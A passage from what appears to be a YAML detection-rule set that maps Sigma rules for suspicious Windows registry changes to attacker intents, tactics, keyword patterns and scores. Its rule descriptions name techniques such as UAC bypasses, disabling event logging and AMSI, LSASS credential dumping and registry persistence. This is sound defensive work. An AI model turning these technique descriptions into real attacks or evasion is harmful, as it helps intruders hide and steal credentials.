    summary_bonus: 0.1
- id: sigma_3a9b8c1e_5b2e_4f7a_9d1c_2a7f3b6e1c55
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects attempts to delete the RunMRU registry key, which stores the
    history of commands executed via the run dialog.

    In the clickfix techniques, the phishing lures instruct users to open a run dialog
    through (Win + R) and execute malicious commands.

    Adversaries may delete this key to cover their tracks after executing commands.

    '
  conditions:
    summary:
      regex_any:
      - runmru
      - registry
      - deletion
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_526cc8bc_1cdc_48ad_8b26_f19bff969cec
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when the "index" value of a scheduled task is removed or deleted
    from the registry. Which effectively hides it from any tooling such as "schtasks
    /query"
  conditions:
    summary:
      regex_any:
      - removal
      - index
      - value
      - hide
      - schedule
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_acd74772_5f88_45c7_956b_6a7b36c294d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Remove SD (Security Descriptor) value in \Schedule\TaskCache\Tree registry
    hive to hide schedule task. This technique is used by Tarrask malware
  conditions:
    summary:
      regex_any:
      - removal
      - value
      - hide
      - schedule
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_460479f3_80b7_42da_9c43_2cc1d54dbccd
  intent: persistence_installation
  tactic: persistence
  description: Sysmon registry detection of a local hidden user account.
  conditions:
    summary:
      regex_any:
      - creation
      - local
      - hidden
      - user
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_47e0852a_cf81_4494_a8e6_31864f8c86ed
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects Pandemic Windows Implant
  conditions:
    summary:
      regex_any:
      - pandemic
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ea3bf32_9680_422d_9f50_e90716b12a66
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated
    with the Windows Store. It will run a binary file contained in a low-privilege
    registry.
  conditions:
    summary:
      regex_any:
      - bypass
      - wsreset
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6d235fc_1d38_4b12_adbe_325f06728f37
  intent: unknown
  tactic: g0069
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  conditions:
    summary:
      regex_any:
      - cmstp
      - execution
      - registry
      - event
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a9e1b2c_8f7d_4a1e_9b3c_0f6d7e5a4b1f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects modifications or creations of Windows Defender''s default
    threat action settings based on severity to ''allow'' or take ''no action''.

    This is a highly suspicious configuration change that effectively disables Defender''s
    ability to automatically mitigate threats of a certain severity level,

    allowing malicious software to run unimpeded. An attacker might use this technique
    to bypass defenses before executing payloads.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - threat
      - severity
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_919f2ef0_be2d_4a7a_b635_eb2b41fde044
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot,
    Windows Event Log service will stop writing events.
  conditions:
    summary:
      regex_any:
      - disable
      - security
      - events
      - logging
      - adding
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a2d6c47_75b0_45bd_b133_2c0be75349fd
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects potential malicious modification of the property value of
    IsCredGuardEnabled from

    HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to disable Cred
    Guard on a system.

    This is usually used with UseLogonCredential to manipulate the caching credentials.

    '
  conditions:
    summary:
      regex_any:
      - wdigest
      - credguard
      - registry
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5aad0995_46ab_41bd_a9ff_724f41114971
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the volume shadow copy service initialization and processing
    via esentutl. Registry keys such as HKLM\\System\\CurrentControlSet\\Services\\VSS\\Diag\\VolSnap\\Volume
    are captured.
  conditions:
    summary:
      regex_any:
      - esentutl
      - volume
      - shadow
      - copy
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a6b33c02_8305_488f_8585_03cb2a7763f2
  intent: unknown
  tactic: s0005
  description: Detects the use of Windows Credential Editor (WCE)
  conditions:
    summary:
      regex_any:
      - windows
      - credential
      - editor
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ac8866c7_ce44_46fd_8c17_b24acff96ca8
  intent: unknown
  tactic: resource_development
  description: Detects the installation of the Azure Hybrid Connection Manager service
    to allow remote code execution from Azure function.
  conditions:
    summary:
      regex_any:
      - hybridconnectionmanager
      - service
      - installation
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c8e96cd_2bed_487d_9de0_b46c90cade56
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a registry key used by IceID in a campaign that distributes
    malicious OneNote files
  conditions:
    summary:
      regex_any:
      - potential
      - qakbot
      - registry
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7f9ab88_7557_4a69_b30e_0a8f91b3a0e7
  intent: execution
  tactic: execution
  description: Detects the presence of a registry key created during Azorult execution
  conditions:
    summary:
      regex_any:
      - registry
      - entries
      - azorult
      - malware
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba6b9e43_1d45_4d3c_a504_1043a64c8469
  intent: execution
  tactic: execution
  description: Detects static QMS 810 and mimikatz driver name used by Mimikatz as
    exploited in CVE-2021-1675 and CVE-2021-34527
  conditions:
    summary:
      regex_any:
      - printernightmare
      - mimikatz
      - driver
      - name
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_67a6c006_3fbe_46a7_9074_2ba3b82c3000
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects value modification of registry key containing path to binary
    used as screensaver.
  conditions:
    summary:
      regex_any:
      - path
      - screensaver
      - binary
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f663a6d9_9d1b_49b8_b2b1_0637914d199a
  intent: persistence_installation
  tactic: persistence
  description: Detects abusing Windows 10 Narrator's Feedback-Hub
  conditions:
    summary:
      regex_any:
      - narrator
      - feedback
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d67572a0_e2ec_45d6_b8db_c100d14b8ef2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects NetNTLM downgrade attack
  conditions:
    summary:
      regex_any:
      - netntlm
      - downgrade
      - attack
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6aa1d992_5925_4e9f_a49b_845e51d1de01
  intent: persistence_installation
  tactic: persistence
  description: 'Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs
    value in the Registry key can be abused to obtain persistence and privilege escalation

    by causing a malicious DLL to be loaded and run in the context of separate processes
    on the computer.

    '
  conditions:
    summary:
      regex_any:
      - added
      - appcertdlls
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f84b697_c9ed_4420_8ab5_e09af5b2345d
  intent: persistence_installation
  tactic: persistence
  description: DLLs that are specified in the AppInit_DLLs value in the Registry key
    HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll
    into every process that loads user32.dll
  conditions:
    summary:
      regex_any:
      - added
      - appinit_dlls
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3d27f6dd_1c74_4687_b4fa_ca849d128d1c
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of office test registry that allows a user to
    specify an arbitrary DLL that will be executed every time an Office application
    is started
  conditions:
    summary:
      regex_any:
      - office
      - application
      - startup
      - office
      - test
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_295a59c1_7b79_4b47_a930_df12c15fc9c2
  intent: unknown
  tactic: initial_access
  description: Alerts on trust record modification within the registry, indicating
    usage of macros
  conditions:
    summary:
      regex_any:
      - windows
      - registry
      - trust
      - record
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_277efb8f_60be_4f10_b4d3_037802f37167
  intent: persistence_installation
  tactic: persistence
  description: Detects persistence registry keys for Recycle Bin
  conditions:
    summary:
      regex_any:
      - registry
      - persistence
      - mechanisms
      - recycle
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a54f842a_3713_4b45_8c84_5f136fdebd3c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the modification of the PortProxy registry key which is used
    for port forwarding.
  conditions:
    summary:
      regex_any:
      - portproxy
      - registry
      - entry
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b175490_b652_4b02_b1de_5b5b4083c5f8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects actions caused by the RedMimicry Winnti playbook
  conditions:
    summary:
      regex_any:
      - redmimicry
      - winnti
      - playbook
      - registry
      - manipulation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b98968aa_dbc0_4a9c_ac35_108363cbf8d5
  intent: persistence_installation
  tactic: persistence
  description: Detects potential malicious modification of run keys by winekey or
    team9 backdoor
  conditions:
    summary:
      regex_any:
      - winekey
      - registry
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c74d7efc_8826_45d9_b8bb_f04fac9e4eff
  intent: defense_evasion
  tactic: defense_evasion
  description: Rule to detect the configuration of Run Once registry key. Configured
    payload can be run by runonce.exe /AlternateShellStartup
  conditions:
    summary:
      regex_any:
      - once
      - task
      - configuration
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_152f3630_77c1_4284_bcc0_4cc68ab2f6e7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the shell open key manipulation (exefile and ms-settings) used
    for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe,
    slui.exe via registry keys (e.g. UACMe 33 or 62)
  conditions:
    summary:
      regex_any:
      - shell
      - open
      - registry
      - keys
      - manipulation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_55e29995_75e7_451a_bef0_6225e2f13597
  intent: credential_harvesting
  tactic: credential_access
  description: Detects changes to the Registry in which a monitor program gets registered
    to dump the memory of the lsass.exe process
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - lsass
      - silentprocessexit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eeb30123_9fbd_4ee8_aaa0_2e545bbed6dc
  intent: persistence_installation
  tactic: persistence
  description: 'Detects the addition of a SSP to the registry. Upon a reboot or API
    call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.

    '
  conditions:
    summary:
      regex_any:
      - security
      - support
      - provider
      - added
      - configuration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_baca5663_583c_45f9_b5dc_ea96a22ce542
  intent: persistence_installation
  tactic: persistence
  description: Detects the usage and installation of a backdoor that uses an option
    to register a malicious debugger for built-in tools that are accessible in the
    login screen
  conditions:
    summary:
      regex_any:
      - sticky
      - like
      - backdoor
      - usage
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9577edbb_851f_4243_8c91_1d5b50c1a39b
  intent: persistence_installation
  tactic: persistence
  description: Detects creation/modification of Assistive Technology applications
    and persistence with usage of 'at'
  conditions:
    summary:
      regex_any:
      - atbroker
      - registry
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c5037d1_c568_49b3_88c7_9846a5bdc2be
  intent: persistence_installation
  tactic: persistence
  description: Detects the suspicious RUN keys created by software located in Download
    or temporary Outlook/Internet Explorer directories
  conditions:
    summary:
      regex_any:
      - suspicious
      - from
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3503044_60ce_4bf4_bbcb_e3db98788823
  intent: persistence_installation
  tactic: persistence
  description: Detects a method to load DLL via LSASS process using an undocumented
    Registry key
  conditions:
    summary:
      regex_any:
      - load
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62120148_6b7a_42be_8b91_271c04e281a3
  intent: data_staging
  tactic: collection
  description: Detects Processes accessing the camera and microphone from suspicious
    folder
  conditions:
    summary:
      regex_any:
      - suspicious
      - camera
      - microphone
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d431012_2ab5_4db7_a84e_b29809da2172
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects enabling of the "AllowAnonymousCallback" registry value, which
    allows a remote connection between computers that do not have a trust relationship.
  conditions:
    summary:
      regex_any:
      - enable
      - remote
      - connection
      - between
      - anonymous
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1547e27c_3974_43e2_a7d7_7f484fb928ec
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the modification of the registry to allow a driver or service
    to persist in Safe Mode.
  conditions:
    summary:
      regex_any:
      - registry
      - persistence
      - service
      - safe
      - mode
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_944e8941_f6f6_4ee8_ac05_1c224e923c0e
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may use port monitors to run an attacker supplied DLL
    during system boot for persistence or privilege escalation.

    A port monitor can be set through the AddMonitor API call to set a DLL to be loaded
    at startup.

    '
  conditions:
    summary:
      regex_any:
      - port
      - monitor
      - persistence
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_092af964_4233_4373_b4ba_d86ea2890288
  intent: persistence_installation
  tactic: persistence
  description: Detects when an attacker adds a new "Debugger" value to the "AeDebug"
    key in order to achieve persistence which will get invoked when an application
    crashes
  conditions:
    summary:
      regex_any:
      - debugger
      - entry
      - aedebug
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37b437cf_3fc5_4c8e_9c94_1d7c9aff842b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect enable rdp feature to allow specific user to rdp connect on
    the targeted machine
  conditions:
    summary:
      regex_any:
      - allow
      - remote
      - assistance
      - feature
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_160d2780_31f7_4922_8b3a_efce30e63e96
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the AMSI come server registry key in order disable
    AMSI scanning functionalities. When AMSI attempts to starts its COM component,
    it will query its registered CLSID and return a non-existent COM server. This
    causes a load failure and prevents any scanning methods from being accessed, ultimately
    rendering AMSI useless
  conditions:
    summary:
      regex_any:
      - potential
      - amsi
      - server
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9df5f547_c86a_433e_b533_f2794357e242
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - classes
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f59c3faf_50f3_464b_9f4c_1b67ab512d99
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - common
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f674e36a_4b91_431e_8aef_f8a96c2aca35
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - currentcontrolset
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_20f0ee37_5942_4e45_b7d5_c5b5db9df5cd
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - currentversion
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cbf93e5d_ca6c_4722_8bea_e9119007c248
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - currentversion
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a80f662f_022f_4429_9b8c_b1a41aaa6688
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - internet
      - explorer
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_baecf8fb_edbf_429f_9ade_31fc3f22b970
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - office
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_046218bd_e0d8_4113_a3c3_895a12b2b298
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - session
      - manager
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7a2fd40_3ae1_4a85_bf80_15cf624fb1b1
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - system
      - scripts
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d6c2ce7e_afb5_4337_9ca4_4b5254ed0565
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - winsock2
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b29aed60_ebd1_442b_9cb5_16a1d0324adb
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - wow6432node
      - currentversion
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18f2065c_d36c_464a_a748_bcf909acb2e3
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - wow6432node
      - classes
      - autorun
      - keys
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_480421f9_417f_4d3b_9552_fd2728443ec8
  intent: persistence_installation
  tactic: persistence
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  conditions:
    summary:
      regex_any:
      - wow6432node
      - windows
      - currentversion
      - autorun
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53330955_dc52_487f_a3a2_da24dcff99b5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects setting of a new registry database value related to BgInfo
    configuration. Attackers can for example set this value to save the results of
    the commands executed by BgInfo in order to exfiltrate information.
  conditions:
    summary:
      regex_any:
      - bginfo
      - custom
      - path
      - registry
      - configuration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_992dd79f_dde8_4bb0_9085_6350ba97cfb3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects setting of a new registry value related to BgInfo configuration,
    which can be abused to execute custom VBScript via "BgInfo.exe"
  conditions:
    summary:
      regex_any:
      - bginfo
      - custom
      - vbscript
      - registry
      - configuration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd277474_5c52_4423_a52b_ac2d7969902f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects setting of a new registry value related to BgInfo configuration,
    which can be abused to execute custom WMI query via "BgInfo.exe"
  conditions:
    summary:
      regex_any:
      - bginfo
      - custom
      - query
      - registry
      - configuration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46dd5308_4572_4d12_aa43_8938f0184d4f
  intent: defense_evasion
  tactic: defense_evasion
  description: Bypasses User Account Control using a fileless method
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - delegateexecute
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_674202d0_b22a_4af4_ae5f_2eda1f3da1af
  intent: persistence_installation
  tactic: persistence
  description: Bypasses User Account Control using Event Viewer and a relevant Windows
    Registry modification
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - event
      - viewer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_724ea201_6514_4f38_9739_e5973c34f49a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the setting of the environement variable "windir" to a non
    default value.

    Attackers often abuse this variable in order to trigger a UAC bypass via the "SilentCleanup"
    task.

    The SilentCleanup task located in %windir%\system32\cleanmgr.exe is an auto-elevated
    task that can be abused to elevate any file with administrator privileges without
    prompting UAC.

    '
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - silentcleanup
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_509e84b9_a71a_40e0_834f_05470369bd1e
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to the default RDP port.

    Remote desktop is a common feature in operating systems. It allows a user to log
    into a remote system using an interactive session with a graphical user interface.

    Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as
    Remote Desktop Services (RDS).

    '
  conditions:
    summary:
      regex_any:
      - default
      - port
      - changed
      - standard
      - port
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_45e112d0_7759_4c2a_aa36_9f8fb79d3393
  intent: persistence_installation
  tactic: persistence
  description: Hides the file extension through modification of the registry
  conditions:
    summary:
      regex_any:
      - change
      - domain
      - zone
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4916a35e_bfc4_47d0_8e25_a003d7067061
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes in Sysmon driver altitude value.

    If the Sysmon driver is configured to load at an altitude of another registered
    service, it will fail to load at boot.

    '
  conditions:
    summary:
      regex_any:
      - sysmon
      - driver
      - altitude
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d9263bd_dc47_4a58_bc92_5474abab390c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects tampering with the "ChannelAccess" registry key in order to
    change access to Windows event channel.
  conditions:
    summary:
      regex_any:
      - change
      - winevt
      - channel
      - access
      - permission
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b64a026b_8deb_4c1d_92fd_98893209dff1
  intent: persistence_installation
  tactic: persistence
  description: Running Chrome VPN Extensions via the Registry install 2 vpn extension
  conditions:
    summary:
      regex_any:
      - running
      - chrome
      - extensions
      - registry
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ac9159cc_c364_4304_8f0a_d63fc1a0aabb
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the ClickOnce trust prompt registry key in order
    to enable an installation from different locations such as the Internet.
  conditions:
    summary:
      regex_any:
      - clickonce
      - trust
      - prompt
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_61a7697c_cb79_42a8_a2ff_5f0cdfae0130
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - cobaltstrike
      - service
      - installations
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07743f65_7ec9_404a_a519_913db7118a8d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects changes to 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute'
  conditions:
    summary:
      regex_any:
      - hijack
      - sdclt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2ff692c2_4594_41ec_8fcb_46587de769e0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling the CrashDump per registry (as used by HermeticWiper)
  conditions:
    summary:
      regex_any:
      - crashcontrol
      - crashdump
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8839e550_52d7_4958_9f2f_e13c1e736838
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the addition of the ''MiniNt'' key to the registry. Upon a
    reboot, Windows Event Log service will stop writing events.

    Windows Event Log is a service that collects and stores event logs from the operating
    system and applications. It is an important component of Windows security and
    auditing.

    Adversary may want to disable this service to disable logging of security events
    which could be used to detect their activities.

    '
  conditions:
    summary:
      regex_any:
      - security
      - event
      - logging
      - disabled
      - minint
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a07f0359_4c90_4dc4_a681_8ffea40b4f47
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect the creation of a service with a service binary located in a
    suspicious directory
  conditions:
    summary:
      regex_any:
      - service
      - binary
      - suspicious
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7530b96f_ad8e_431d_a04d_ac85cc461fdc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the abuse of custom file open handler, executing powershell
  conditions:
    summary:
      regex_any:
      - custom
      - file
      - open
      - handler
      - executes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9827ae57_3802_418f_994b_d5ecf5cd974b
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of the "Debugger" value to the "DbgManagedDebugger"
    key in order to achieve persistence. Which will get invoked when an application
    crashes
  conditions:
    summary:
      regex_any:
      - potential
      - registry
      - persistence
      - attempt
      - dbgmanageddebugger
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a982fc9c_6333_4ffb_a51d_addb04e8b529
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the Setting of Windows Defender Exclusions
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exclusions
      - added
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85b88e05_dadc_430b_8a9e_53ff1cd30aae
  intent: impact_operations
  tactic: impact
  description: 'Detects registry value settings that would replace the user''s desktop
    background.

    This is a common technique used by malware to change the desktop background to
    a ransom note or other image.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - desktop
      - background
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_31e124fb_5dc4_42a0_83b3_44a69c77b271
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects activity that indicates a user disabling the ability for Antivirus
    mini filter to inspect a "Dev Drive".

    '
  conditions:
    summary:
      regex_any:
      - antivirus
      - filter
      - driver
      - disallowed
      - drive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b7273a4_ba5d_4d8a_b04f_11f2900d043a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the HypervisorEnforcedCodeIntegrity registry key
    and the "Enabled" value being set to 0 in order to disable the Hypervisor Enforced
    Code Integrity feature. This allows an attacker to load unsigned and untrusted
    code to be run in the kernel

    '
  conditions:
    summary:
      regex_any:
      - hypervisor
      - enforced
      - code
      - integrity
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f2954d2_99c2_4d42_a065_ca36740f187b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the "DisableHypervisorEnforcedPagingTranslation"
    registry value. Where the it is set to "1" in order to disable the Hypervisor
    Enforced Paging Translation feature.

    '
  conditions:
    summary:
      regex_any:
      - hypervisor
      - enforced
      - paging
      - translation
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9d3436ef_9476_4c43_acca_90ce06bdf33a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled
    parameter in Registry, which can be used to execute code in context of the DHCP
    server (restart required)
  conditions:
    summary:
      regex_any:
      - dhcp
      - callout
